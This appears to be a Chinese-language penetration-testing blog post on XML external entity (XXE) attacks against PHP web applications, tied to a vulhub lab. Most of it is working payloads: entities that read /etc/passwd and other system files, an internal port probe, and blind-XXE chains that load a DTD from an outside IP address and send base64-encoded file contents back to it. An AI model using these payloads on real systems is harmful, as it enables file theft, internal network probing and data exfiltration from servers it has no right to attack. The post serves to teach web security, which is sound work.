---
draft: false
date: 2017-12-09 23:02:22
title: XXE 漏洞
description: XXE 漏洞是针对使用 XML 交互的 Web 应用程序的攻击方法
categories:
  - Pentest
tags:
  - xml
---

### 0x00 XXE
XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛

外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法

### 0x01 示例代码
实验环境：[https://github.com/vulhub/vulhub/tree/master/php/php_xxe](https://github.com/vulhub/vulhub/tree/master/php/php_xxe?_blank)  
simplexml_load_string.php
```
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);
echo $xml->name;
```

### 0x02 判断是否有xxe漏洞
![95](/img/post/20180906-110942.png)

### 0x03 读取文件
* 外部引用读取passwd

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
  <!ELEMENT name ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
  <!ELEMENT name ANY >
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

* 外部引用dtd文件读取passwd

evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
  <!ELEMENT name ANY >
  <!ENTITY % xxe SYSTEM "http://114.115.183.86/evil.dtd">
  %xxe;
]>
<root>
  <name>&b;</name>
</root>
```

### 0x04 端口探测
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
  <!ENTITY http SYSTEM 'http://10.11.11.20:3306/'>
]>
<root>
  <name>&http;</name>
</root>
```

### 0x05 Blind-XXE
* 方法一：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.dtd">
    %remote;
]>
```
evil.dtd内容：
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/issue">
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://114.115.183.86/?%file;'>">
%all;
%send;
```

* 方法二：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
    <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.xml">
    %remote;   <!--引用remote来将外部文件evil.xml引入到解释上下文中-->
    %xxe;   <!--执行%xxe，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发-->
]>
<root>&send;</root>
```
evil.xml内容：
```
<!ENTITY % xxe "<!ENTITY send SYSTEM 'http://114.115.183.86/a.php?content=%file;'>">
```



#### Reference(侵删)：
* [http://blog.csdn.net/u011721501/article/details/43775691](http://blog.csdn.net/u011721501/article/details/43775691?_blank)
* [https://security.tencent.com/index.php/blog/msg/69](https://security.tencent.com/index.php/blog/msg/69?_blank)
